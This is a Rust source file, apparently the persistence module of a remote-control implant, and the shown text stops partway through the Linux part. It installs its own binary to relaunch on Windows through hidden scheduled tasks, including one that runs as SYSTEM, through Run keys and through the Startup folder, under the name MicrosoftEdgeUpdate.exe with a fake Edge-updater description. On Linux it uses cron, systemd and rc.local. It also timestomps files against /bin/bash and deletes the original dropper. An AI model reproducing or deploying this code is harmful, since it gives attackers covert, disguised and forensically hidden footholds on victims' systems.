//! Persistence — multi-technique, named by ID.
//!
//! Protocol (PERSIST_PROBE / PERSIST_STATUS / PERSIST_INSTALL / PERSIST_REMOVE):
//!   Linux techniques:   cron-reboot  systemd-user  systemd-system  rc-local  cron-system
//!   Windows techniques: schtask-logon  registry-run  startup-folder  schtask-boot  registry-run-hklm
//!
//! Single-technique shorthand (PERSIST:install/remove/check) is also handled.

#[cfg(unix)]
use std::path::PathBuf;

pub enum PersistResult {
    Ok(String),
    Err(String),
}

impl PersistResult {
    pub fn into_string(self) -> String {
        match self { PersistResult::Ok(s) | PersistResult::Err(s) => s }
    }
}

// ── Single-technique public API (PERSIST:install/remove/check shorthand) ─────

pub fn install(blob_path: &str, cleanup_stub: bool) -> PersistResult {
    #[cfg(windows)]  { win::install(blob_path, cleanup_stub) }
    #[cfg(unix)]     { nix::install(blob_path, cleanup_stub) }
}

pub fn remove() -> PersistResult {
    #[cfg(windows)]  { win::remove() }
    #[cfg(unix)]     { nix::remove() }
}

pub fn check() -> PersistResult {
    #[cfg(windows)]  { win::check() }
    #[cfg(unix)]     { nix::check() }
}

// ── Multi-technique public API (PERSIST_PROBE/STATUS/INSTALL/REMOVE) ─────────

pub fn probe(ids: Option<&str>, blob_path: &str) -> String {
    #[cfg(windows)] { win::probe(ids, blob_path) }
    #[cfg(unix)]    { nix::probe(ids, blob_path) }
}

pub fn technique_status(id: &str, blob_path: &str) -> String {
    #[cfg(windows)] { win::technique_status(id, blob_path) }
    #[cfg(unix)]    { nix::technique_status(id, blob_path) }
}

pub fn technique_install(id: &str, blob_path: &str) -> String {
    #[cfg(windows)] { win::technique_install(id, blob_path) }
    #[cfg(unix)]    { nix::technique_install(id, blob_path) }
}

pub fn technique_remove(id: &str) -> String {
    #[cfg(windows)] { win::technique_remove(id) }
    #[cfg(unix)]    { nix::technique_remove(id) }
}

/// Remove every installed technique — called by KILL.
pub fn remove_all() -> String {
    #[cfg(windows)] { win::remove_all() }
    #[cfg(unix)]    { nix::remove_all() }
}

// ── Windows ───────────────────────────────────────────────────────────────────

#[cfg(windows)]
mod win {
    use super::PersistResult;
    use std::os::windows::process::CommandExt;
    use std::path::PathBuf;

    const TASK_NAME:        &str = env!("STRATUM_TASK_NAME");
    const REG_VALUE:        &str = env!("STRATUM_REG_VALUE");
    const CREATE_NO_WINDOW:  u32 = 0x0800_0000;

    // ── Single-technique shorthand ────────────────────────────────────────────

    pub fn install(blob_path: &str, cleanup_stub: bool) -> PersistResult {
        technique_install_inner("schtask-logon", blob_path, cleanup_stub)
    }

    pub fn remove() -> PersistResult {
        match technique_remove_inner("schtask-logon") {
            s if s.starts_with("OK:") => PersistResult::Ok(s),
            s => PersistResult::Err(s),
        }
    }

    pub fn check() -> PersistResult {
        PersistResult::Ok(technique_status_inner("schtask-logon", ""))
    }

    // ── Multi-technique API ───────────────────────────────────────────────────

    pub fn probe(ids: Option<&str>, blob_path: &str) -> String {
        let all = ["schtask-logon", "registry-run", "startup-folder",
                   "schtask-boot", "registry-run-hklm"];
        let filter: Option<Vec<&str>> = ids.map(|s| s.split(',').map(|t| t.trim()).collect());
        let mut lines = "PERSIST_PROBE_RESULT\n".to_string();
        for t in all {
            if filter.as_ref().map(|f| f.contains(&t)).unwrap_or(true) {
                lines.push_str(&probe_one(t, blob_path));
                lines.push('\n');
            }
        }
        lines
    }

    pub fn technique_status(id: &str, blob_path: &str) -> String {
        technique_status_inner(id, blob_path)
    }

    pub fn technique_install(id: &str, blob_path: &str) -> String {
        match technique_install_inner(id, blob_path, false) {
            PersistResult::Ok(s) | PersistResult::Err(s) => s,
        }
    }

    pub fn technique_remove(id: &str) -> String {
        technique_remove_inner(id)
    }

    pub fn remove_all() -> String {
        let all = ["schtask-logon", "registry-run", "startup-folder",
                   "schtask-boot", "registry-run-hklm"];
        let mut out = String::new();
        for t in all { out.push_str(&technique_remove_inner(t)); out.push('\n'); }
        out
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    fn is_admin() -> bool {
        use windows_sys::Win32::Security::{
            CheckTokenMembership, CreateWellKnownSid, WinBuiltinAdministratorsSid,
        };
        use windows_sys::Win32::Foundation::BOOL;
        unsafe {
            let mut sid = [0u8; 68];
            let mut sid_size: u32 = sid.len() as u32;
            if CreateWellKnownSid(
                WinBuiltinAdministratorsSid,
                std::ptr::null_mut(),
                sid.as_mut_ptr() as *mut _,
                &mut sid_size,
            ) == 0 { return false; }
            let mut is_member: BOOL = 0;
            CheckTokenMembership(0, sid.as_ptr() as *mut _, &mut is_member) != 0
                && is_member != 0
        }
    }


    fn appdata_dir() -> PathBuf {
        let base = std::env::var("APPDATA").unwrap_or_else(|_| ".".to_string());
        PathBuf::from(base).join("Microsoft").join("EdgeUpdate")
    }

    fn startup_dir() -> PathBuf {
        let base = std::env::var("APPDATA").unwrap_or_else(|_| ".".to_string());
        PathBuf::from(base)
            .join("Microsoft").join("Windows")
            .join("Start Menu").join("Programs").join("Startup")
    }

    fn deploy_binary(blob_path: &str) -> Result<PathBuf, String> {
        let exe = match std::env::current_exe() {
            Ok(p) => p,
            Err(_) => PathBuf::from(blob_path),
        };
        let dest_dir = appdata_dir();
        std::fs::create_dir_all(&dest_dir)
            .map_err(|e| format!("ERROR: mkdir {}: {}", dest_dir.display(), e))?;
        let dest = dest_dir.join("MicrosoftEdgeUpdate.exe");
        if !dest.exists() {
            std::fs::copy(&exe, &dest)
                .map_err(|e| format!("ERROR: copy to {}: {}", dest.display(), e))?;
        }
        Ok(dest)
    }

    fn probe_one(id: &str, blob_path: &str) -> String {
        match id {
            "schtask-logon" => {
                let payload = appdata_dir().join("MicrosoftEdgeUpdate.exe");
                let task_ok = schtask_exists(TASK_NAME);
                let file_ok = payload.exists();
                let st = if task_ok && file_ok { "installed" }
                         else if task_ok || file_ok { "partial" }
                         else { "available" };
                format!("PROBE:schtask-logon:{}:user:Scheduled Task ONLOGON — {}", st, TASK_NAME)
            }
            "registry-run" => {
                let val_exists = reg_value_exists(
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", REG_VALUE);
                let st = if val_exists { "installed" } else { "available" };
                format!("PROBE:registry-run:{}:user:HKCU Run key — fires at logon", st)
            }
            "startup-folder" => {
                let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
                let st = if dest.exists() { "installed" } else { "available" };
                format!("PROBE:startup-folder:{}:user:User Startup folder — fires at logon", st)
            }
            "schtask-boot" => {
                if !is_admin() {
                    return "PROBE:schtask-boot:unavailable:admin:Requires admin — ATSYSTEM boot task".to_string();
                }
                let task_name = format!("{}-Boot", TASK_NAME);
                let st = if schtask_exists(&task_name) { "installed" } else { "available" };
                format!("PROBE:schtask-boot:{}:admin:Scheduled Task ATBOOT (SYSTEM) — {}", st, task_name)
            }
            "registry-run-hklm" => {
                if !is_admin() {
                    return "PROBE:registry-run-hklm:unavailable:admin:Requires admin — HKLM Run key".to_string();
                }
                let val_exists = reg_value_exists(
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", REG_VALUE);
                let st = if val_exists { "installed" } else { "available" };
                format!("PROBE:registry-run-hklm:{}:admin:HKLM Run key — fires for all users", st)
            }
            _ => format!("PROBE:{}:unavailable:user:Unknown technique", id),
        }
    }

    fn technique_status_inner(id: &str, blob_path: &str) -> String {
        let _ = blob_path;
        match id {
            "schtask-logon" => {
                let payload = appdata_dir().join("MicrosoftEdgeUpdate.exe");
                let task_ok = schtask_exists(TASK_NAME);
                let file_ok = payload.exists();
                if task_ok && file_ok {
                    format!("ACTIVE: schtask-logon\n  Task: {} (exists)\n  Payload: {} (exists)",
                        TASK_NAME, payload.display())
                } else if task_ok {
                    format!("PARTIAL: schtask-logon — task '{}' exists but payload missing: {}",
                        TASK_NAME, payload.display())
                } else if file_ok {
                    format!("PARTIAL: schtask-logon — payload exists ({}) but task missing: {}",
                        payload.display(), TASK_NAME)
                } else {
                    "NOT INSTALLED: schtask-logon".to_string()
                }
            }
            "registry-run" => {
                if reg_value_exists(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", REG_VALUE) {
                    format!("ACTIVE: registry-run\n  Key: HKCU\\...\\Run\\{}", REG_VALUE)
                } else {
                    "NOT INSTALLED: registry-run".to_string()
                }
            }
            "startup-folder" => {
                let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
                if dest.exists() {
                    format!("ACTIVE: startup-folder\n  File: {}", dest.display())
                } else {
                    "NOT INSTALLED: startup-folder".to_string()
                }
            }
            "schtask-boot" => {
                let task_name = format!("{}-Boot", TASK_NAME);
                if schtask_exists(&task_name) {
                    format!("ACTIVE: schtask-boot\n  Task: {} (exists)", task_name)
                } else {
                    "NOT INSTALLED: schtask-boot".to_string()
                }
            }
            "registry-run-hklm" => {
                if reg_value_exists(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", REG_VALUE) {
                    format!("ACTIVE: registry-run-hklm\n  Key: HKLM\\...\\Run\\{}", REG_VALUE)
                } else {
                    "NOT INSTALLED: registry-run-hklm".to_string()
                }
            }
            _ => format!("ERROR: Unknown technique '{}'", id),
        }
    }

    fn technique_install_inner(id: &str, blob_path: &str, cleanup_stub: bool) -> PersistResult {
        match id {
            "schtask-logon" => install_schtask_logon(blob_path, cleanup_stub),
            "registry-run"  => install_registry_run(blob_path),
            "startup-folder" => install_startup_folder(blob_path),
            "schtask-boot"  => {
                if !is_admin() {
                    return PersistResult::Err("ERROR: schtask-boot requires admin".to_string());
                }
                install_schtask_boot(blob_path)
            }
            "registry-run-hklm" => {
                if !is_admin() {
                    return PersistResult::Err("ERROR: registry-run-hklm requires admin".to_string());
                }
                install_registry_run_hklm(blob_path)
            }
            _ => PersistResult::Err(format!("ERROR: Unknown technique '{}'", id)),
        }
    }

    fn technique_remove_inner(id: &str) -> String {
        match id {
            "schtask-logon"     => remove_schtask_logon(),
            "registry-run"      => remove_registry_run(),
            "startup-folder"    => remove_startup_folder(),
            "schtask-boot"      => remove_schtask_boot(),
            "registry-run-hklm" => remove_registry_run_hklm(),
            _ => format!("ERROR: Unknown technique '{}'", id),
        }
    }

    // ── schtask-logon ─────────────────────────────────────────────────────────

    fn install_schtask_logon(blob_path: &str, cleanup_stub: bool) -> PersistResult {
        let dest = match deploy_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return PersistResult::Err(e),
        };
        let xml = task_xml_logon(dest.to_string_lossy().as_ref());
        let xml_path = {
            use rand::RngCore;
            let mut rnd = [0u8; 6];
            rand::thread_rng().fill_bytes(&mut rnd);
            std::env::temp_dir().join(format!("{}.xml", hex::encode(rnd)))
        };
        if std::fs::write(&xml_path, xml.as_bytes()).is_err() {
            return PersistResult::Err("ERROR: failed to write task XML".to_string());
        }
        let status = std::process::Command::new("schtasks")
            .args(["/create", "/tn", TASK_NAME, "/xml",
                   &xml_path.to_string_lossy(), "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        let _ = std::fs::remove_file(&xml_path);
        match status {
            Ok(s) if s.success() => {
                let mut msg = format!(
                    "OK: schtask-logon installed\n  Payload: {}\n  Task: {}\nARTIFACT:persist_payload:{}\nARTIFACT:persist_task:{}",
                    dest.display(), TASK_NAME, dest.display(), TASK_NAME
                );
                if cleanup_stub && blob_path != dest.to_string_lossy().as_ref() {
                    let _ = std::fs::remove_file(blob_path);
                    msg.push_str(&format!("\n  Original deleted: {}", blob_path));
                }
                PersistResult::Ok(msg)
            }
            _ => PersistResult::Err(format!(
                "ERROR: schtasks /create failed (payload at {} — remove manually)", dest.display()
            )),
        }
    }

    fn remove_schtask_logon() -> String {
        let status = std::process::Command::new("schtasks")
            .args(["/delete", "/tn", TASK_NAME, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        let dest = appdata_dir().join("MicrosoftEdgeUpdate.exe");
        let _ = std::fs::remove_file(&dest);
        match status {
            Ok(s) if s.success() => format!(
                "OK: schtask-logon removed\n  Task '{}' deleted\n  Payload '{}' deleted\nARTIFACT_REMOVED:persist_task:{}\nARTIFACT_REMOVED:persist_payload:{}",
                TASK_NAME, dest.display(), TASK_NAME, dest.display()
            ),
            _ => format!("ERROR: schtasks /delete failed (task: {})", TASK_NAME),
        }
    }

    fn schtask_exists(name: &str) -> bool {
        std::process::Command::new("schtasks")
            .args(["/query", "/tn", name])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    fn task_xml_logon(exe_path: &str) -> String {
        format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Keeps your Microsoft Edge browser up to date.</Description></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT2M</Delay></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
  <Actions Context="Author"><Exec><Command>{}</Command></Exec></Actions>
</Task>"#, exe_path)
    }

    // ── schtask-boot (admin) ──────────────────────────────────────────────────

    fn install_schtask_boot(blob_path: &str) -> PersistResult {
        let dest = match deploy_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return PersistResult::Err(e),
        };
        let task_name = format!("{}-Boot", TASK_NAME);
        let xml = task_xml_boot(dest.to_string_lossy().as_ref());
        let xml_path = {
            use rand::RngCore;
            let mut rnd = [0u8; 6];
            rand::thread_rng().fill_bytes(&mut rnd);
            std::env::temp_dir().join(format!("{}.xml", hex::encode(rnd)))
        };
        if std::fs::write(&xml_path, xml.as_bytes()).is_err() {
            return PersistResult::Err("ERROR: failed to write task XML".to_string());
        }
        let status = std::process::Command::new("schtasks")
            .args(["/create", "/tn", &task_name, "/xml",
                   &xml_path.to_string_lossy(), "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        let _ = std::fs::remove_file(&xml_path);
        match status {
            Ok(s) if s.success() => PersistResult::Ok(format!(
                "OK: schtask-boot installed\n  Payload: {}\n  Task: {}\nARTIFACT:persist_payload:{}\nARTIFACT:persist_task:{}",
                dest.display(), task_name, dest.display(), task_name
            )),
            _ => PersistResult::Err(format!("ERROR: schtasks /create failed for {}", task_name)),
        }
    }

    fn remove_schtask_boot() -> String {
        let task_name = format!("{}-Boot", TASK_NAME);
        let status = std::process::Command::new("schtasks")
            .args(["/delete", "/tn", &task_name, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        match status {
            Ok(s) if s.success() => format!(
                "OK: schtask-boot removed\n  Task '{}' deleted\nARTIFACT_REMOVED:persist_task:{}", task_name, task_name
            ),
            _ => format!("ERROR: schtasks /delete failed (task: {})", task_name),
        }
    }

    fn task_xml_boot(exe_path: &str) -> String {
        format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Keeps your Microsoft Edge browser up to date.</Description></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT1M</Delay></BootTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions Context="Author"><Exec><Command>{}</Command></Exec></Actions>
</Task>"#, exe_path)
    }

    // ── registry-run (HKCU) ───────────────────────────────────────────────────

    fn install_registry_run(blob_path: &str) -> PersistResult {
        let dest = match deploy_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return PersistResult::Err(e),
        };
        let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
        let dest_str = dest.to_string_lossy();
        let reg_val = if dest_str.contains(' ') {
            format!("\"{}\"", dest_str)
        } else {
            dest_str.into_owned()
        };
        let status = std::process::Command::new("reg")
            .args(["add", key, "/v", REG_VALUE, "/t", "REG_SZ",
                   "/d", &reg_val, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        match status {
            Ok(s) if s.success() => PersistResult::Ok(format!(
                "OK: registry-run installed\n  Key: {}\\{}\n  Payload: {}\nARTIFACT:persist_payload:{}\nARTIFACT:persist_reg:{}\\{}",
                key, REG_VALUE, dest.display(), dest.display(), key, REG_VALUE
            )),
            _ => PersistResult::Err("ERROR: reg add failed for HKCU Run key".to_string()),
        }
    }

    fn remove_registry_run() -> String {
        let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
        let status = std::process::Command::new("reg")
            .args(["delete", key, "/v", REG_VALUE, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        let dest = appdata_dir().join("MicrosoftEdgeUpdate.exe");
        let _ = std::fs::remove_file(&dest);
        match status {
            Ok(s) if s.success() => format!(
                "OK: registry-run removed\n  Key value '{}' deleted\nARTIFACT_REMOVED:persist_reg:{}\\{}\nARTIFACT_REMOVED:persist_payload:{}",
                REG_VALUE, key, REG_VALUE, dest.display()
            ),
            _ => format!("ERROR: reg delete failed for {}\\{}", key, REG_VALUE),
        }
    }

    fn reg_value_exists(key: &str, value: &str) -> bool {
        std::process::Command::new("reg")
            .args(["query", key, "/v", value])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    // ── registry-run-hklm (admin) ─────────────────────────────────────────────

    fn install_registry_run_hklm(blob_path: &str) -> PersistResult {
        let dest = match deploy_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return PersistResult::Err(e),
        };
        let key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        let dest_str = dest.to_string_lossy();
        let reg_val = if dest_str.contains(' ') {
            format!("\"{}\"", dest_str)
        } else {
            dest_str.into_owned()
        };
        let status = std::process::Command::new("reg")
            .args(["add", key, "/v", REG_VALUE, "/t", "REG_SZ",
                   "/d", &reg_val, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        match status {
            Ok(s) if s.success() => PersistResult::Ok(format!(
                "OK: registry-run-hklm installed\n  Key: {}\\{}\n  Payload: {}\nARTIFACT:persist_payload:{}\nARTIFACT:persist_reg:{}\\{}",
                key, REG_VALUE, dest.display(), dest.display(), key, REG_VALUE
            )),
            _ => PersistResult::Err("ERROR: reg add failed for HKLM Run key (admin required)".to_string()),
        }
    }

    fn remove_registry_run_hklm() -> String {
        let key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        let status = std::process::Command::new("reg")
            .args(["delete", key, "/v", REG_VALUE, "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        match status {
            Ok(s) if s.success() => format!(
                "OK: registry-run-hklm removed\n  Key value '{}' deleted\nARTIFACT_REMOVED:persist_reg:{}\\{}",
                REG_VALUE, key, REG_VALUE
            ),
            _ => format!("ERROR: reg delete failed for {}\\{} (admin required)", key, REG_VALUE),
        }
    }

    // ── startup-folder ────────────────────────────────────────────────────────

    fn install_startup_folder(blob_path: &str) -> PersistResult {
        let dest_dir = startup_dir();
        std::fs::create_dir_all(&dest_dir)
            .map_err(|e| PersistResult::Err(format!("ERROR: mkdir startup: {}", e)))
            .ok();
        let dest = dest_dir.join("MicrosoftEdgeUpdate.exe");
        let exe = std::env::current_exe().unwrap_or_else(|_| std::path::PathBuf::from(blob_path));
        if let Err(e) = std::fs::copy(&exe, &dest) {
            return PersistResult::Err(format!("ERROR: copy to startup folder: {}", e));
        }
        PersistResult::Ok(format!(
            "OK: startup-folder installed\n  File: {}\nARTIFACT:persist_payload:{}",
            dest.display(), dest.display()
        ))
    }

    fn remove_startup_folder() -> String {
        let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
        let _ = std::fs::remove_file(&dest);
        format!("OK: startup-folder removed\n  File '{}' deleted\nARTIFACT_REMOVED:persist_payload:{}", dest.display(), dest.display())
    }
}

// ── Linux ─────────────────────────────────────────────────────────────────────

#[cfg(unix)]
mod nix {
    use super::{PathBuf, PersistResult};

    const PERSIST_DIR_SUFFIX: &str = env!("STRATUM_PERSIST_SUFFIX");
    const PERSIST_PAYLOAD:    &str = env!("STRATUM_PERSIST_PAYLOAD");
    const PERSIST_SVC:        &str = env!("STRATUM_PERSIST_SVC");
    const CRON_MARKER:        &str = env!("STRATUM_CRON_COMMENT");
    const RC_MARKER:          &str = env!("STRATUM_RC_COMMENT");

    // ── Single-technique shorthand (PERSIST:install/remove/check → cron-reboot) ──

    pub fn install(blob_path: &str, cleanup_stub: bool) -> PersistResult {
        match install_cron_reboot(blob_path) {
            s if s.starts_with("OK:") => {
                let mut msg = s;
                if cleanup_stub && !blob_path.is_empty() {
                    let _ = std::fs::remove_file(blob_path);
                    msg.push_str(&format!("\n  Original deleted: {}", blob_path));
                }
                PersistResult::Ok(msg)
            }
            s => PersistResult::Err(s),
        }
    }

    pub fn remove() -> PersistResult {
        match remove_cron_reboot() {
            s if s.starts_with("OK:") => PersistResult::Ok(s),
            s => PersistResult::Err(s),
        }
    }

    pub fn check() -> PersistResult {
        PersistResult::Ok(status_cron_reboot())
    }

    // ── Multi-technique API ───────────────────────────────────────────────────

    pub fn probe(ids: Option<&str>, _blob_path: &str) -> String {
        let all = ["cron-reboot", "systemd-user", "systemd-system", "rc-local", "cron-system"];
        let filter: Option<Vec<&str>> = ids.map(|s| s.split(',').map(|t| t.trim()).collect());
        let mut lines = "PERSIST_PROBE_RESULT\n".to_string();
        for t in all {
            if filter.as_ref().map(|f| f.contains(&t)).unwrap_or(true) {
                lines.push_str(&probe_one(t));
                lines.push('\n');
            }
        }
        lines
    }

    pub fn technique_status(id: &str, _blob_path: &str) -> String {
        match id {
            "cron-reboot"    => status_cron_reboot(),
            "systemd-user"   => status_systemd_user(),
            "systemd-system" => status_systemd_system(),
            "rc-local"       => status_rc_local(),
            "cron-system"    => status_cron_system(),
            _ => format!("ERROR: Unknown technique '{}'", id),
        }
    }

    pub fn technique_install(id: &str, blob_path: &str) -> String {
        match id {
            "cron-reboot"    => install_cron_reboot(blob_path),
            "systemd-user"   => install_systemd_user(blob_path),
            "systemd-system" => install_systemd_system(blob_path),
            "rc-local"       => install_rc_local(blob_path),
            "cron-system"    => install_cron_system(blob_path),
            _ => format!("ERROR: Unknown technique '{}'", id),
        }
    }

    pub fn technique_remove(id: &str) -> String {
        match id {
            "cron-reboot"    => remove_cron_reboot(),
            "systemd-user"   => remove_systemd_user(),
            "systemd-system" => remove_systemd_system(),
            "rc-local"       => remove_rc_local(),
            "cron-system"    => remove_cron_system(),
            _ => format!("ERROR: Unknown technique '{}'", id),
        }
    }

    pub fn remove_all() -> String {
        let mut out = String::new();
        out.push_str(&remove_cron_reboot());   out.push('\n');
        out.push_str(&remove_systemd_user());  out.push('\n');
        out.push_str(&remove_systemd_system()); out.push('\n');
        out.push_str(&remove_rc_local());      out.push('\n');
        out.push_str(&remove_cron_system());   out.push('\n');
        out
    }

    // ── Shared helpers ────────────────────────────────────────────────────────

    fn persist_dir() -> PathBuf {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(PERSIST_DIR_SUFFIX)
    }

    fn persist_payload() -> PathBuf {
        persist_dir().join(PERSIST_PAYLOAD)
    }

    fn ensure_binary(blob_path: &str) -> Result<PathBuf, String> {
        let dir  = persist_dir();
        let dest = dir.join(PERSIST_PAYLOAD);
        if !dest.exists() {
            std::fs::create_dir_all(&dir)
                .map_err(|e| format!("ERROR: mkdir {}: {}", dir.display(), e))?;
            let src = std::env::current_exe()
                .unwrap_or_else(|_| PathBuf::from(blob_path));
            std::fs::copy(&src, &dest)
                .map_err(|e| format!("ERROR: copy to {}: {}", dest.display(), e))?;
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&dest,
                std::fs::Permissions::from_mode(0o700));
            // Timestomp against /bin/bash via libc::utimes — no child process spawn.
            timestomp_from_bash(&dest);
            timestomp_from_bash(&dir);
        }
        Ok(dest)
    }

    fn is_root() -> bool {
        unsafe { libc::getuid() == 0 }
    }

    fn timestomp_from_bash(path: &std::path::Path) {
        use std::time::UNIX_EPOCH;
        let meta = match std::fs::metadata("/bin/bash") {
            Ok(m) => m,
            Err(_) => return,
        };
        let to_timeval = |t: std::io::Result<std::time::SystemTime>| -> libc::timeval {
            let dur = t.ok()
                .and_then(|st| st.duration_since(UNIX_EPOCH).ok())
                .unwrap_or_default();
            libc::timeval { tv_sec: dur.as_secs() as libc::time_t,
                            tv_usec: dur.subsec_micros() as libc::suseconds_t }
        };
        let times = [to_timeval(meta.accessed()), to_timeval(meta.modified())];
        if let Some(p) = path.to_str() {
            let cpath = std::ffi::CString::new(p).unwrap_or_default();
            unsafe { libc::utimes(cpath.as_ptr(), times.as_ptr()); }
        }
    }

    fn read_crontab(as_root: bool) -> Vec<String> {
        let mut cmd = std::process::Command::new("crontab");
        if as_root { cmd.args(["-u", "root"]); }
        cmd.arg("-l")
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout)
                .lines().map(|l| l.to_string()).collect())
            .unwrap_or_default()
    }

    fn write_crontab(content: &str, as_root: bool) -> std::io::Result<()> {
        use std::io::Write;
        use rand::RngCore;
        let mut rnd = [0u8; 6];
        rand::thread_rng().fill_bytes(&mut rnd);
        let tmp = std::env::temp_dir().join(format!(".{}", hex::encode(rnd)));
        let mut f = std::fs::File::create(&tmp)?;
        f.write_all(content.as_bytes())?;
        drop(f);
        let mut cmd = std::process::Command::new("crontab");
        if as_root { cmd.args(["-u", "root"]); }
        cmd.arg(&tmp).status()?;
        let _ = std::fs::remove_file(&tmp);
        Ok(())
    }

    fn probe_one(id: &str) -> String {
        match id {
            "cron-reboot" => {
                let cron_ok = read_crontab(false).iter().any(|l| l.contains(CRON_MARKER));
                let file_ok = persist_payload().exists();
                let st = if cron_ok && file_ok { "installed" }
                         else if cron_ok || file_ok { "partial" }
                         else { "available" };
                format!("PROBE:cron-reboot:{}:user:User crontab @reboot — fires at every system boot", st)
            }
            "systemd-user" => {
                let svcfile = home_dir().join(".config/systemd/user")
                    .join(format!("{}.service", PERSIST_SVC));
                let file_ok = svcfile.exists();
                let enab_ok = systemctl_is_enabled(PERSIST_SVC, true);
                let st = if file_ok && enab_ok { "installed" }
                         else if file_ok || enab_ok { "partial" }
                         else { "available" };
                let linger = linger_active();
                let note = if linger { "" } else { " (linger off: logon-only)" };
                format!("PROBE:systemd-user:{}:user:systemd user service{}", st, note)
            }
            "systemd-system" => {
                if !is_root() {
                    return "PROBE:systemd-system:unavailable:root:Requires root — /etc/systemd/system/ service".to_string();
                }
                let svcfile = PathBuf::from(format!("/etc/systemd/system/{}.service", PERSIST_SVC));
                let file_ok = svcfile.exists();
                let enab_ok = systemctl_is_enabled(PERSIST_SVC, false);
                let st = if file_ok && enab_ok { "installed" }
                         else if file_ok || enab_ok { "partial" }
                         else { "available" };
                format!("PROBE:systemd-system:{}:root:System-wide systemd service — fires at boot", st)
            }
            "rc-local" => {
                if !is_root() {
                    return "PROBE:rc-local:unavailable:root:Requires root — /etc/rc.local injection".to_string();
                }
                let rc = std::path::Path::new("/etc/rc.local");
                if !rc.exists() {
                    return "PROBE:rc-local:unavailable:root:/etc/rc.local not present on this system".to_string();
                }
                let content = std::fs::read_to_string(rc).unwrap_or_default();
                let st = if content.contains(RC_MARKER) { "installed" } else { "available" };
                format!("PROBE:rc-local:{}:root:/etc/rc.local injection — fires at boot", st)
            }
            "cron-system" => {
                if !is_root() {
                    return "PROBE:cron-system:unavailable:root:Requires root — root crontab @reboot".to_string();
                }
                let st = if read_crontab(true).iter().any(|l| l.contains(CRON_MARKER))
                    { "installed" } else { "available" };
                format!("PROBE:cron-system:{}:root:Root crontab @reboot — fires at boot", st)
            }
            _ => format!("PROBE:{}:unavailable:user:Unknown technique", id),
        }
    }

    fn home_dir() -> PathBuf {
        PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string()))
    }

    fn systemctl_is_enabled(svc: &str, user: bool) -> bool {
        let mut cmd = std::process::Command::new("systemctl");
        if user { cmd.arg("--user"); }
        cmd.args(["is-enabled", svc])
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().starts_with("enabled"))
            .unwrap_or(false)
    }

    fn linger_active() -> bool {
        let user = std::env::var("USER").unwrap_or_default();
        std::process::Command::new("loginctl")
            .args(["show-user", &user])
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).contains("Linger=yes"))
            .unwrap_or(false)
    }

